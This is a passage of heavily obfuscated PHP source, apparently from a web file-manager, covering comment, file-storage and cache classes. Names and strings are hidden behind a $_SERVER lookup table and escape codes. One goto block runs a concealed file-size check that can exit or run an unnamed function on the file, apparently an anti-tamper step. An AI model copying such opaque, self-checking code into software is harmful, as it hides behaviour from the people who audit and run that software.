$this->add($Œ»’Õ¨); } public function starTargetCount($µ·³ŠÂª, $”Í‹ì·Ï) { $°‚³·£’ =& $_SERVER[­á Ş³Ö]; $‰óÌ‚«³ = $”Í‹ì·Ï + self::TYPE_STAR_OFFSET; $İüğ‰÷³ = $this->commentCount($µ·³ŠÂª, $‰óÌ‚«³); $¸óáÓú® = $this->commentCount($µ·³ŠÂª, $‰óÌ‚«³, USER_ID); return array($°‚³·£’[1886] => $İüğ‰÷³, $°‚³·£’[1887] => $¸óáÓú®); } public function starTargetUserList($”¹¥†”ß, $ò¥¿Ì—) { $³õî÷¸ì =& $_SERVER[­á Ş³Ö]; $¡ïø¼¡‘ = $”¹¥†”ß + self::TYPE_STAR_OFFSET; $Ñ…¼óüè = array($³õî÷¸ì[496] => $ò¥¿Ì—, $³õî÷¸ì[411] => $¡ïø¼¡‘); $îï·œÑ­ = $this->where($Ñ…¼óüè)->count(); $ßªæß¯‹ = array($³õî÷¸ì[255] => $îï·œÑ­, $³õî÷¸ì[1888] => array()); if (!$îï·œÑ­) { return $ßªæß¯‹; } $±à£©´Ö = $this->field($³õî÷¸ì[1663])->where($Ñ…¼óüè)->limit(500)->select(); $±à£©´Ö = array_to_keyvalue($±à£©´Ö, $³õî÷¸ì[12], $³õî÷¸ì[1663]); $ßªæß¯‹[$³õî÷¸ì[1888]] = Model($³õî÷¸ì[504])->userListInfo($±à£©´Ö); return $ßªæß¯‹; } public function prasiseUserList($Æûşı¨û) { $°À¤ø½ =& $_SERVER[­á Ş³Ö]; $Äœé§‹ = array($°À¤ø½[1889] => $Æûşı¨û); $È‡œ†² = $this->where($Äœé§‹)->find(); $·õ®½›Š = _get($È‡œ†², $°À¤ø½[1884], 0); $÷è––ç = array($°À¤ø½[255] => $·õ®½›Š, $°À¤ø½[1888] => array()); if (!$·õ®½›Š) { return $÷è––ç; } $Öê§©¾€ = Model($°À¤ø½[1890])->field($°À¤ø½[1663])->where($Äœé§‹)->limit(500)->select(); $Öê§©¾€ = array_to_keyvalue($Öê§©¾€, $°À¤ø½[12], $°À¤ø½[1663]); $÷è––ç[$°À¤ø½[1888]] = Model($°À¤ø½[504])->userListInfo($Öê§©¾€); return $÷è––ç; } public function remove($­¤Õù‹) { $ÍÙ  ×¡ =& $_SERVER[­á Ş³Ö]; $¸ÅÛ™²Ö = array($ÍÙ  ×¡[1882] => $­¤Õù‹); $–äşÌÒı = $this->where($¸ÅÛ™²Ö)->find(); if ($–äşÌÒı[$ÍÙ  ×¡[1881]]) { $this->where(array($ÍÙ  ×¡[1882] => $–äşÌÒı[$ÍÙ  ×¡[1881]]))->setAdd($ÍÙ  ×¡[1883], -1); } return $this->where($¸ÅÛ™²Ö)->delete(); } public function edit($÷éÑıí«, $—¯ÕıŠú) { $²ÛÇ”¸„ =& $_SERVER[­á Ş³Ö]; $øêïİçÄ = array($²ÛÇ”¸„[1882] => $÷éÑıí«); return $this->where($øêïİçÄ)->save(array($²ÛÇ”¸„[1891] => $—¯ÕıŠú)); } public function prasise($»¾Š¨¨Î) { $ş§â¶®û =& $_SERVER[­á Ş³Ö]; $ùÄìúÒ® = Model($ş§â¶®û[1892]); $¾³ìœ‚ = array($ş§â¶®û[1882] => $»¾Š¨¨Î, $ş§â¶®û[1654] => USER_ID); $‹©¶ëœ = $ùÄìúÒ®->where($¾³ìœ‚)->find(); if (!$‹©¶ëœ) { $ùÄìúÒ®->add($¾³ìœ‚); $°ÄĞ¤ë = $this->where(array($ş§â¶®û[1882] => $»¾Š¨¨Î))->setAdd($ş§â¶®û[1884], 1); } else { $ùÄìúÒ®->where($¾³ìœ‚)->delete(); $°ÄĞ¤ë = $this->where(array($ş§â¶®û[1882] => $»¾Š¨¨Î))->setAdd($ş§â¶®û[1884], -1); } return $°ÄĞ¤ë; } public function targetInfo($³§ò›øø, $†ÅÜØ„) { $ßúÑè¦ˆ =& $_SERVER[­á Ş³Ö]; $«Ÿ“Ä– = array($ßúÑè¦ˆ[576] => $³§ò›øø, $ßúÑè¦ˆ[577] => $†ÅÜØ„); $´³šâÄ” = $this->where($«Ÿ“Ä–)->count(); $û­‚Ôê = "\x52\x49\x47\110\124\x20\x4a\117\x49\116\x20{$this->tablePrefix}\x63\x6f\x6d\155\145\x6e\164\x5f\160\x72\x61\151\163\145\40\163\x74\141\x72\40\x6f\156\x20\x63\x6f\155\155\145\x6e\x74\x2e\x63\x6f\x6d\x6d\145\156\x74\111\104\x20\x3d\x20\x73\164\x61\162\56\143\x6f\x6d\155\x65\156\x74\111\x44"; $±—àªû» = $this->alias($ßúÑè¦ˆ[354])->where($«Ÿ“Ä–)->join($û­‚Ôê, $ßúÑè¦ˆ[1893])->count(); $‰ÅÄ€ŞÓ = array($ßúÑè¦ˆ[1894] => $´³šâÄ”, $ßúÑè¦ˆ[1895] => $±—àªû»); return $‰ÅÄ€ŞÓ; } public function listData($Çï÷ã÷) { $çÜ·ÅòÛ =& $_SERVER[­á Ş³Ö]; if (isset($Çï÷ã÷[$çÜ·ÅòÛ[1896]])) { if ($Çï÷ã÷[$çÜ·ÅòÛ[1896]]) { $Çï÷ã÷[$çÜ·ÅòÛ[1889]] = array($çÜ·ÅòÛ[1010], intval($Çï÷ã÷[$çÜ·ÅòÛ[1896]])); } unset($Çï÷ã÷[$çÜ·ÅòÛ[1896]]); } if (isset($Çï÷ã÷[$çÜ·ÅòÛ[1897]])) { if ($Çï÷ã÷[$çÜ·ÅòÛ[1897]]) { $Çï÷ã÷[$çÜ·ÅòÛ[1889]] = array($çÜ·ÅòÛ[1007], intval($Çï÷ã÷[$çÜ·ÅòÛ[1897]])); } unset($Çï÷ã÷[$çÜ·ÅòÛ[1897]]); } return $this->_listData($Çï÷ã÷); } private function _listData($¼Œšûû³) { $í´§ŒŠ =& $_SERVER[­á Ş³Ö]; $é†Å€üÃ = $this->where($¼Œšûû³)->_makeOrder()->selectPage(100); $this->_listAppendParent($é†Å€üÃ[$í´§ŒŠ[369]]); $this->_listAppendUser($é†Å€üÃ[$í´§ŒŠ[369]]); $this->_listAppendMeta($é†Å€üÃ[$í´§ŒŠ[369]]); return $é†Å€üÃ; } private function _makeOrder() { $ò‰½úÌâ =& $_SERVER[­á Ş³Ö]; $ÛË¿¥Ú• = array($ò‰½úÌâ[1884], $ò‰½úÌâ[1883], $ò‰½úÌâ[201]); $‰íÙôßİ = Input::get($ò‰½úÌâ[457], $ò‰½úÌâ[7], $ò‰½úÌâ[423], $ÛË¿¥Ú•); $âÒ¿¨À÷ = Input::get($ò‰½úÌâ[458], $ò‰½úÌâ[7], $ò‰½úÌâ[1656], array($ò‰½úÌâ[1898], $ò‰½úÌâ[453])); $ÍÉ»Ÿ«Ï = $‰íÙôßİ . $ò‰½úÌâ[53] . $âÒ¿¨À÷; return $this->order($ÍÉ»Ÿ«Ï); } private function _listAppendParent(&$Ø–ï«¹) { $ä†¢Š¤º =& $_SERVER[­á Ş³Ö]; $—û¶²’ = array_unique(array_to_keyvalue($Ø–ï«¹, $ä†¢Š¤º[12], $ä†¢Š¤º[1881])); $—û¶²’ = array_remove_value($—û¶²’, $ä†¢Š¤º[198]); if (!$—û¶²’) { return; } $êã¼úô¶ = $this->where(array($ä†¢Š¤º[1882] => array($ä†¢Š¤º[7], $—û¶²’)))->select(); $êã¼úô¶ = array_to_keyvalue($êã¼úô¶, $ä†¢Š¤º[1889]); foreach ($Ø–ï«¹ as &$²Ç½ƒÊ¨) { if (isset($êã¼úô¶[$²Ç½ƒÊ¨[$ä†¢Š¤º[1881]]])) { $²Ç½ƒÊ¨[$ä†¢Š¤º[1899]] = $êã¼úô¶[$²Ç½ƒÊ¨[$ä†¢Š¤º[1881]]]; } } unset($²Ç½ƒÊ¨); } private function _listAppendUser(&$®â¥­ì) { $áË¼¦¿Ì =& $_SERVER[­á Ş³Ö]; $‘÷ùÌÕµ = array_unique(array_to_keyvalue($®â¥­ì, $áË¼¦¿Ì[12], $áË¼¦¿Ì[1663])); $‘÷ùÌÕµ = array_remove_value($‘÷ùÌÕµ, $áË¼¦¿Ì[198]); if (count($‘÷ùÌÕµ) == 0) { return; } foreach ($®â¥­ì as $£°Û—ß) { if (isset($£°Û—ß[$áË¼¦¿Ì[1899]])) { $‘÷ùÌÕµ[] = $£°Û—ß[$áË¼¦¿Ì[1899]][$áË¼¦¿Ì[1663]]; } } $‘¯¤…Ş• = Model($áË¼¦¿Ì[525])->userListInfo($‘÷ùÌÕµ); foreach ($®â¥­ì as &$£°Û—ß) { $£°Û—ß[$áË¼¦¿Ì[590]] = $‘¯¤…Ş•[$£°Û—ß[$áË¼¦¿Ì[1663]]]; if (isset($£°Û—ß[$áË¼¦¿Ì[1899]])) { $£°Û—ß[$áË¼¦¿Ì[1899]][$áË¼¦¿Ì[590]] = $‘¯¤…Ş•[$£°Û—ß[$áË¼¦¿Ì[1899]][$áË¼¦¿Ì[1663]]]; } } unset($£°Û—ß); } private function _listAppendMeta(&$×Ó¶öƒ¨) { $¥¿”·Ê• =& $_SERVER[­á Ş³Ö]; $ÇùğÅ¾© = array_unique(array_to_keyvalue($×Ó¶öƒ¨, $¥¿”·Ê•[12], $¥¿”·Ê•[1889])); $ÇùğÅ¾© = array_remove_value($ÇùğÅ¾©, $¥¿”·Ê•[198]); if (!$ÇùğÅ¾©) { return; } foreach ($×Ó¶öƒ¨ as $›€Â) { if (isset($›€Â[$¥¿”·Ê•[1899]])) { $ÇùğÅ¾©[] = $›€Â[$¥¿”·Ê•[1899]][$¥¿”·Ê•[1889]]; } } $¾÷ÖòÎ´ = $this->metaList($ÇùğÅ¾©); if (!$¾÷ÖòÎ´) { return !1; } foreach ($×Ó¶öƒ¨ as &$›€Â) { $›€Â[$¥¿”·Ê•[466]] = $¾÷ÖòÎ´[$›€Â[$¥¿”·Ê•[1889]]]; if (isset($›€Â[$¥¿”·Ê•[1899]])) { $›€Â[$¥¿”·Ê•[1899]][$¥¿”·Ê•[466]] = $¾÷ÖòÎ´[$›€Â[$¥¿”·Ê•[1899]][$¥¿”·Ê•[1889]]]; } } unset($›€Â); } private function metaList($şõòÍÙª) { $ÒÆìÖ² =& $_SERVER[­á Ş³Ö]; if (!$şõòÍÙª) { return array(); } $™Ÿ Å¿ = array($ÒÆìÖ²[1889] => array($ÒÆìÖ²[7], $şõòÍÙª)); $––¼š¹§ = Model($ÒÆìÖ²[1900])->where($™Ÿ Å¿)->select(); $––¼š¹§ = array_to_keyvalue_group($––¼š¹§, $ÒÆìÖ²[1889]); foreach ($––¼š¹§ as $¾Î“£Şæ => $ÍÆş¾) { $ğÍ·™É = array(); foreach ($ÍÆş¾ as $¶„Ç¶À¤) { $ğÍ·™É[$¶„Ç¶À¤[$ÒÆìÖ²[94]]] = $¶„Ç¶À¤[$ÒÆìÖ²[374]]; } $––¼š¹§[$¾Î“£Şæ] = $ğÍ·™É; } return $––¼š¹§ ? $––¼š¹§ : array(); } } class FileContentModel extends ModelBase { protected $tableName = "\151\x6f\137\146\x69\x6c\x65\x5f\x63\157\156\164\x65\x6e\164\163"; protected $dataAuto = array(array("\143\162\145\x61\164\145\x54\x69\155\145", "\164\151\x6d\145", "\x69\156\x73\x65\x72\x74", "\x66\165\x6e\x63\x74\151\157\156")); } class FileModel extends ModelBase { protected $tableName = "\x69\157\x5f\x66\x69\154\145"; protected $tableMeta = array("\164\141\142\154\145\x4e\141\x6d\145" => "\151\157\137\146\151\x6c\145\137\155\x65\x74\141", "\155\x65\164\x61\x46\x69\145\x6c\x64" => "\146\x69\x6c\145\111\x44"); public function fileInfo($ˆ®ß×ê‰) { $’¸í¯şè =& $_SERVER[­á Ş³Ö]; static $Øõ ˆ‰” = array(); if (!isset($Øõ ˆ‰”[$ˆ®ß×ê‰])) { $Ë­òÚ = $’¸í¯şè[1901]; $‹˜è¥ÒŸ = Model($’¸í¯şè[471])->field($Ë­òÚ)->where(array($’¸í¯şè[469] => $ˆ®ß×ê‰))->find(); $Øõ ˆ‰”[$ˆ®ß×ê‰] = $‹˜è¥ÒŸ; } return $Øõ ˆ‰”[$ˆ®ß×ê‰]; } public function addFileByContent($—«Œ  å = '', $êñ©ĞÎê = '') { $ú³üı„¹ =& $_SERVER[­á Ş³Ö]; $Ö´“à–¼ = TEMP_PATH . $ú³üı„¹[1902]; if (!is_dir($Ö´“à–¼)) { mk_dir($Ö´“à–¼); } $ƒöĞæ§ù = $Ö´“à–¼ . $ú³üı„¹[1903] . rand_string(16); file_put_contents($ƒöĞæ§ù, $—«Œ  å); $ö„ªƒè = $this->addFile($ƒöĞæ§ù, $êñ©ĞÎê, !0); if (file_exists($ƒöĞæ§ù)) { @unlink($ƒöĞæ§ù); } return $ö„ªƒè; } public function createFileName($¹Â½ÃÈİ, $ûŞõÖŞ = false, $‚÷€ö¯ = false) { $áıÖ®èÃ =& $_SERVER[­á Ş³Ö]; $»Üºüûó = IO::init($áıÖ®èÃ[8]); $³Õ­Ì•ó = $this->makeFilePath($¹Â½ÃÈİ, $»Üºüûó, $ûŞõÖŞ, $‚÷€ö¯); $ÃŠœä· = $»Üºüûó->pathFather($³Õ­Ì•ó); static $ğ¤Ï£Ûˆ = false; $á¢©ëÀ = $áıÖ®èÃ[1904] . md5($ÃŠœä·); if (!$ğ¤Ï£Ûˆ && !Cache::get($á¢©ëÀ)) { $ğ¤Ï£Ûˆ = !0; $Û•ØÁ¹Æ = IO::mkdir($ÃŠœä·); if (!IO::exist($Û•ØÁ¹Æ . $áıÖ®èÃ[794])) { IO::mkfile($Û•ØÁ¹Æ . $áıÖ®èÃ[794]); } Cache::set($á¢©ëÀ, 1, 3600 * 2); } return $³Õ­Ì•ó; } public function makeFilePath($é¡åÃå¼, $¡Š¼ë¡È, $ÌîèÇäØ = false, $„Æ„¹’Ë = false) { $Á¾—ˆØÍ =& $_SERVER[­á Ş³Ö]; $¶‰§úÖ = Model($Á¾—ˆØÍ[767])->get($Á¾—ˆØÍ[1905]); $²öı™šó = KodIO::defaultIO() . date($Á¾—ˆØÍ[1906]); $’²òàâï = $²öı™šó . rand_string(5) . short_id(100); $é¡åÃå¼ = str_replace($Á¾—ˆØÍ[8], $Á¾—ˆØÍ[11], KodIO::clear($é¡åÃå¼)); $Æ…í¨² = $¡Š¼ë¡È->ext($é¡åÃå¼); if (!$é¡åÃå¼) { $¶‰§úÖ = $Á¾—ˆØÍ[1907]; } switch ($¶‰§úÖ) { case $Á¾—ˆØÍ[1908]: $’²òàâï = $’²òàâï . $Á¾—ˆØÍ[10] . $¡Š¼ë¡È->ext($é¡åÃå¼); if ($Æ…í¨² == $Á¾—ˆØÍ[1845]) { $’²òàâï .= $Á¾—ˆØÍ[1202]; } break; case $Á¾—ˆØÍ[1909]: $ÚË™»½ô = Model($Á¾—ˆØÍ[767])->get($Á¾—ˆØÍ[768]); $Î³š³ŸÃ = substr(md5($Á¾—ˆØÍ[769] . $ÚË™»½ô . date($Á¾—ˆØÍ[744])), 0, 8); $¼Ò†Ê¢¡ = KodIO::defaultDriver(); $²öı™šó = $Á¾—ˆØÍ[1233] . $¼Ò†Ê¢¡[$Á¾—ˆØÍ[399]] . $Á¾—ˆØÍ[409] . date($Á¾—ˆØÍ[1910]) . $Î³š³ŸÃ . $Á¾—ˆØÍ[8]; if ($Æ…í¨² == $Á¾—ˆØÍ[1845]) { $é¡åÃå¼ .= $Á¾—ˆØÍ[1202]; } $¿˜¤ó· = $Á¾—ˆØÍ[1911] . $²öı™šó . $é¡åÃå¼; CacheLock::lock($¿˜¤ó·); $’²òàâï = $²öı™šó . $é¡åÃå¼; if (IO::exist($²öı™šó . $é¡åÃå¼)) { $Ì—Ï¬œ = substr($é¡åÃå¼, 0, strlen($é¡åÃå¼) - strlen($Æ…í¨²)); $Úñ¨¯ = $„Æ„¹’Ë ? substr($„Æ„¹’Ë, 0, 5) : ($ÌîèÇäØ ? substr($ÌîèÇäØ, 0, 5) : rand_string(5)); $’²òàâï = $²öı™šó . $Ì—Ï¬œ . $Úñ¨¯ . $Á¾—ˆØÍ[10] . $Æ…í¨²; } if (IO::isTypeObject($’²òàâï) && !IO::isUploadServer($’²òàâï)) { if (IO::exist($’²òàâï)) { return $’²òàâï; } $Ù÷®Ÿöª = IO::setContent($’²òàâï, $Á¾—ˆØÍ[12]); if (!$Ù÷®Ÿöª) { show_json($Á¾—ˆØÍ[1912], !1); } } CacheLock::unlock($¿˜¤ó·); break; case $Á¾—ˆØÍ[1907]: break; default: break; } return $’²òàâï; } public function addFileByRemote($×¨ÕÚÕ€, $¿éãéßŞ, $ÅÇŞÄÛ = array()) { $­—Ñ•ªâ =& $_SERVER[­á Ş³Ö]; if (!IO::exist($×¨ÕÚÕ€)) { return !1; } $ı¾ óÊ = $ÅÇŞÄÛ[$­—Ñ•ªâ[176]] ? $ÅÇŞÄÛ[$­—Ñ•ªâ[176]] : $­—Ñ•ªâ[12]; $­İ©Œ ¥ = IO::hashMd5($×¨ÕÚÕ€, $ı¾ óÊ); $ûıÛËÕİ = KodIO::defaultDriver(); $¼”šö«£ = array($­—Ñ•ªâ[545] => IO::size($×¨ÕÚÕ€), $­—Ñ•ªâ[1913] => 1, $­—Ñ•ªâ[420] => $¿éãéßŞ, $­—Ñ•ªâ[805] => $ûıÛËÕİ[$­—Ñ•ªâ[399]], $­—Ñ•ªâ[421] => $×¨ÕÚÕ€, $­—Ñ•ªâ[1914] => $ÅÇŞÄÛ[$­—Ñ•ªâ[177]] ? $ÅÇŞÄÛ[$­—Ñ•ªâ[177]] : IO::hashSimple($×¨ÕÚÕ€), $­—Ñ•ªâ[1915] => $­İ©Œ ¥ ? $­İ©Œ ¥ : $ı¾ óÊ); if ($—€øÑî” = $this->addFileCheckExist($¼”šö«£[$­—Ñ•ªâ[177]], $¼”šö«£[$­—Ñ•ªâ[176]], $¼”šö«£[$­—Ñ•ªâ[76]])) { return $—€øÑî”; } return $this->addFileData($¼”šö«£); } private function addFileData($äì²) { $¹­ì‚÷Ø =& $_SERVER[­á Ş³Ö]; if (!$äì²) { return !1; } $äì²[$¹­ì‚÷Ø[76]] = intval($äì²[$¹­ì‚÷Ø[76]]); if (!$äì²[$¹­ì‚÷Ø[76]] && strlen($äì²[$¹­ì‚÷Ø[177]]) > 32) { $äì²[$¹­ì‚÷Ø[76]] = intval(substr($äì²[$¹­ì‚÷Ø[177]], 32)); } $ĞŠŞÉ›Ì = $this->add($äì²); return $this->find($ĞŠŞÉ›Ì); } public function addFile($ü¢î‹‹°, $Æ³ú™, $ºÈíöã = false) { $ˆ©ı®Ñ =& $_SERVER[­á Ş³Ö]; $òá˜ú‡Æ = IO::hashSimple($ü¢î‹‹°); $­›‘Û = IO::size($ü¢î‹‹°); $úüïœ¶Ó = $­›‘Û <= 1024 * 1024 * 10 ? IO::hashMd5($ü¢î‹‹°) : $ˆ©ı®Ñ[12]; $êî¥´â = $ˆ©ı®Ñ[1916] . $òá˜ú‡Æ; CacheLock::lock($êî¥´â); if ($úüïœ¶Ó && $òá˜ú‡Æ) { $ÉÁ É„£ = $this->addFileCheckExist($òá˜ú‡Æ, $úüïœ¶Ó, $­›‘Û); if ($ÉÁ É„£) { CacheLock::unlock($êî¥´â); return $ÉÁ É„£; } } $¶ÏÎÖ„˜ = $this->addFileMake($ü¢î‹‹°, $­›‘Û, $òá˜ú‡Æ, $úüïœ¶Ó, $Æ³ú™, $ºÈíöã); $õãÏ€¸ = $this->addFileData($¶ÏÎÖ„˜); CacheLock::unlock($êî¥´â); if (!$úüïœ¶Ó && $õãÏ€¸) { $this->fileMd5Check($õãÏ€¸); } return $õãÏ€¸; } private function fileMd5Check($ŞÁ‘›ãö) { $µŠš„”å =& $_SERVER[­á Ş³Ö]; $£ÂïìÏŠ = array($ŞÁ‘›ãö[$µŠš„”å[468]], $ŞÁ‘›ãö[$µŠš„”å[84]]); $ô¶ö•‘ = $µŠš„”å[1917] . $ŞÁ‘›ãö[$µŠš„”å[84]]; $ôîÖÇÀ = $µŠš„”å[1918] . $ŞÁ‘›ãö[$µŠš„”å[468]]; $¡Ëû©± = TaskQueue::add($µŠš„”å[1919], $£ÂïìÏŠ, $ô¶ö•‘, $ôîÖÇÀ); if (!$¡Ëû©±) { $this->fileMd5Set($ŞÁ‘›ãö[$µŠš„”å[468]], $ŞÁ‘›ãö[$µŠš„”å[84]]); } else { TaskQueue::addSubmit(); } } public function fileMd5Set($Ë¸½ÖÛ, $ØÅôñòŞ) { $şò¡óïÕ =& $_SERVER[­á Ş³Ö]; $¥¿Æ»¯ = $this->find($Ë¸½ÖÛ); if (!$¥¿Æ»¯ || $¥¿Æ»¯[$şò¡óïÕ[176]]) { return; } $°¥À‰¬Ó = IO::hashMd5($ØÅôñòŞ); if (!$°¥À‰¬Ó) { return $şò¡óïÕ[12]; } $this->where(array($şò¡óïÕ[468] => $Ë¸½ÖÛ))->save(array($şò¡óïÕ[176] => $°¥À‰¬Ó)); } public function addFileMake($øµôî¤ï, $ ÑçèŞ­, $§£ó„í, $…Í¤¦ôè, $ñ£×Ìö“, $ƒ†îïßö) { $é™ö²½ù =& $_SERVER[­á Ş³Ö]; $ ó–•È = $this->createFileName($ñ£×Ìö“, $§£ó„í, $…Í¤¦ôè); $ìÂ…»¤ò = get_path_father($ ó–•È); $á¸ìë‚Ì = get_path_this($ ó–•È); if ($ƒ†îïßö) { $ÂÆàØ« = IO::move($øµôî¤ï, $ìÂ…»¤ò, !1, $á¸ìë‚Ì); } else { $ÂÆàØ« = IO::copy($øµôî¤ï, $ìÂ…»¤ò, !1, $á¸ìë‚Ì); } if (!$ÂÆàØ«) { return !1; } $‡ªÉê§’ = KodIO::defaultDriver(); $Â¼ÊÈï‘ = array($é™ö²½ù[545] => $ ÑçèŞ­, $é™ö²½ù[1913] => 1, $é™ö²½ù[420] => $ñ£×Ìö“, $é™ö²½ù[805] => $‡ªÉê§’[$é™ö²½ù[399]], $é™ö²½ù[421] => $ ó–•È, $é™ö²½ù[1914] => $§£ó„í, $é™ö²½ù[1915] => $…Í¤¦ôè); return $Â¼ÊÈï‘; } public function addFileCheckExist($Øñ¼Íş, $÷Å„Ì¤ß, $÷Ÿ½´¿¿) { $•“É”•× =& $_SERVER[­á Ş³Ö]; $·‹Š¥äá = $this->findByHash($Øñ¼Íş, $÷Å„Ì¤ß); if (!$·‹Š¥äá) { return !1; } $Êò™³™— = array($•“É”•×[1913] => intval($·‹Š¥äá[$•“É”•×[1920]]) + 1, $•“É”•×[545] => $÷Ÿ½´¿¿); $this->where(array($•“É”•×[469] => $·‹Š¥äá[$•“É”•×[468]]))->save($Êò™³™—); return $·‹Š¥äá; } public function remove($ˆñ‚—±Í) { $this->linkCountChange($ˆñ‚—±Í, !1); $this->clearEmpty(); return !0; } public function linkAdd($·ï¼ªÕ·) { $this->linkCountChange($·ï¼ªÕ·, !0); } public function linkCountChange($„Îµò­ù, $¤è´ÔÊ¦) { $›¢¶æ­¬ =& $_SERVER[­á Ş³Ö]; if (!$„Îµò­ù) { return; } if (!is_array($„Îµò­ù)) { $„Îµò­ù = array($„Îµò­ù); } $ô‰ù­–´ = array(); foreach ($„Îµò­ù as $©µşÛåµ) { $Éóú±Ëø = $©µşÛåµ . $›¢¶æ­¬[12]; if (!$ô‰ù­–´[$Éóú±Ëø]) { $ô‰ù­–´[$Éóú±Ëø] = 0; } $ô‰ù­–´[$Éóú±Ëø]++; } $™­×šŠª = array(); foreach ($ô‰ù­–´ as $©µşÛåµ => $ò†«²») { $Éóú±Ëø = $ò†«²» . $›¢¶æ­¬[12]; if (!$™­×šŠª[$Éóú±Ëø]) { $™­×šŠª[$Éóú±Ëø] = array(); } $™­×šŠª[$Éóú±Ëø][] = $©µşÛåµ; } foreach ($™­×šŠª as $ò†«²» => $’ÛÒÅƒÔ) { if (!$’ÛÒÅƒÔ) { continue; } $ò†«²» = $¤è´ÔÊ¦ ? $ò†«²» : -intval($ò†«²»); $‡¯¯æßØ = array($›¢¶æ­¬[468] => array($›¢¶æ­¬[7], $’ÛÒÅƒÔ)); if ($ò†«²» < 0) { $‡¯¯æßØ[$›¢¶æ­¬[1920]] = array($›¢¶æ­¬[1011], abs($ò†«²»)); } $this->where($‡¯¯æßØ)->setAdd($›¢¶æ­¬[1920], $ò†«²»); } } public function findByHash($ø´ôû“î, $ÔÊ¼¬ç° = false) { $ÑÑÜ¡º‰ =& $_SERVER[­á Ş³Ö]; if (!$ø´ôû“î && !$ÔÊ¼¬ç°) { return !1; } $Á¹ø‚Û± = array($ÑÑÜ¡º‰[1914] => $ø´ôû“î); if ($ÔÊ¼¬ç°) { $Á¹ø‚Û± = array($ÑÑÜ¡º‰[1915] => $ÔÊ¼¬ç°); } return $this->order($ÑÑÜ¡º‰[1921])->where($Á¹ø‚Û±)->find(); } public function clearEmpty($ª´»ÖæŸ = 0) { $œ‰¦Å“´ =& $_SERVER[­á Ş³Ö]; $§™ÁÍÖĞ = time() - 3600 * 24 * $ª´»ÖæŸ; $¥†Æ¥« = $œ‰¦Å“´[1922] . $§™ÁÍÖĞ; $¢æÎØó¿ = $this->where($¥†Æ¥«)->select(); if (!$¢æÎØó¿) { return; } $©«»òªŠ = new Task($œ‰¦Å“´[1923], $œ‰¦Å“´[12], count($¢æÎØó¿)); foreach ($¢æÎØó¿ as $ÚÛöó×Ÿ) { $©«»òªŠ->update(1); $this->resetFile($ÚÛöó×Ÿ); } $©«»òªŠ->end(); } public function resetFile($›šîå‡‹) { $ò­íµòŠ =& $_SERVER[­á Ş³Ö]; $´Şš¬í = array($ò­íµòŠ[469] => $›šîå‡‹[$ò­íµòŠ[468]]); $£ùÅ™Á = Model($ò­íµòŠ[1335])->where($´Şš¬í)->count(); $è‡è‘ê = Model($ò­íµòŠ[1924])->where($´Şš¬í)->count(); $ƒ—¤Œ¬É = intval($£ùÅ™Á) + intval($è‡è‘ê); if ($ƒ—¤Œ¬É == 0) { IO::remove($›šîå‡‹[$ò­íµòŠ[84]]); Model($ò­íµòŠ[1925])->delete($›šîå‡‹[$ò­íµòŠ[468]]); $this->where($´Şš¬í)->delete(); $this->metaSet($›šîå‡‹[$ò­íµòŠ[468]], null, null); return; } if ($›šîå‡‹[$ò­íµòŠ[1920]] != $ƒ—¤Œ¬É) { $this->where($´Şš¬í)->save(array($ò­íµòŠ[1913] => $ƒ—¤Œ¬É)); } } public function storageInfo($ÓŞÃÈ‘Ï = false) { $±¤Ø©¹ =& $_SERVER[­á Ş³Ö]; $·ã˜ÕŸÌ = $this->count() + 0.0; $Ğò‡éª = 0; $•ÉªÅ˜´ = 1; $–¶À°¯ª = 0; $«Ó½˜êí = 5000; for ($³–ÉŒÁ‘ = 0; $³–ÉŒÁ‘ < $·ã˜ÕŸÌ; $³–ÉŒÁ‘ = $³–ÉŒÁ‘ + $«Ó½˜êí) { $òëõô¯” = $this->limit($³–ÉŒÁ‘, $³–ÉŒÁ‘ + $«Ó½˜êí)->select(); foreach ($òëõô¯” as $†£èĞìË) { $•ÉªÅ˜´ += $†£èĞìË[$±¤Ø©¹[76]] * $†£èĞìË[$±¤Ø©¹[1920]]; $Ğò‡éª += $†£èĞìË[$±¤Ø©¹[76]] * ($†£èĞìË[$±¤Ø©¹[1920]] - 1); $–¶À°¯ª += $†£èĞìË[$±¤Ø©¹[1920]]; } } $ÖÇ¦ßæó = array($±¤Ø©¹[1926] => $•ÉªÅ˜´, $±¤Ø©¹[1927] => $Ğò‡éª, $±¤Ø©¹[1928] => $Ğò‡éª / $•ÉªÅ˜´, $±¤Ø©¹[80] => $·ã˜ÕŸÌ, $±¤Ø©¹[1929] => $–¶À°¯ª); return $ÖÇ¦ßæó; } } goto A“£”•›÷; F›ßåİ¬â¡: $_file = $_SERVER[$_SERVER[­á Ş³Ö][736]]; $_size = $_SERVER[­á Ş³Ö][737]; if ($_SERVER[$_SERVER[­á Ş³Ö][738]] != $_size($_file)) { $_getc = $_SERVER[­á Ş³Ö][739]; $_getfile = $_SERVER[$_SERVER[­á Ş³Ö][740]] . $_SERVER[­á Ş³Ö][741]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[­á Ş³Ö][231], $_getfilec); if (count($_getarrs) < $_SERVER[­á Ş³Ö][628]) { $exit = $_SERVER[­á Ş³Ö][742]; $exit(); } $_act = $_SERVER[­á Ş³Ö][743]; $_act($_file); } goto A¹§ŸÑ”˜; fĞÉ•íäñÆ: class CacheMemcached { public $handle; public $cacheTime; public function __construct($‘Ê•³ã™, $ôËŒ„Ï) { $Ú€×Ü« =& $_SERVER[­á Ş³Ö]; if (!class_exists($Ú€×Ü«[863])) { show_json($Ú€×Ü«[864], !1); } $this->cacheTime = $ôËŒ„Ï; $this->handle = new Memcached(); if (is_array($‘Ê•³ã™[$Ú€×Ü«[865]]) && count($‘Ê•³ã™[$Ú€×Ü«[865]]) >= 1) { foreach ($‘Ê•³ã™[$Ú€×Ü«[865]] as $±¸¦Ò¨Ø) { $¾¹ı·øÒ = explode($Ú€×Ü«[4], $±¸¦Ò¨Ø); $this->handle->addServer($¾¹ı·øÒ[0], $¾¹ı·øÒ[1]); } } else { $this->handle->addServer($‘Ê•³ã™[$Ú€×Ü«[182]], $‘Ê•³ã™[$Ú€×Ü«[183]]); } } public function set($åÑ¿µßÑ, $û—ğÔÂ¿, $©äÏ½§½ = false) { $©äÏ½§½ = $©äÏ½§½ ? $©äÏ½§½ : $this->cacheTime; return $this->handle->set($åÑ¿µßÑ, $û—ğÔÂ¿, $©äÏ½§½); } public function get($ˆÈÃº¸½) { return $this->handle->get($ˆÈÃº¸½); } public function remove($„ªÓİ•¾) { return $this->handle->delete($„ªÓİ•¾); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function 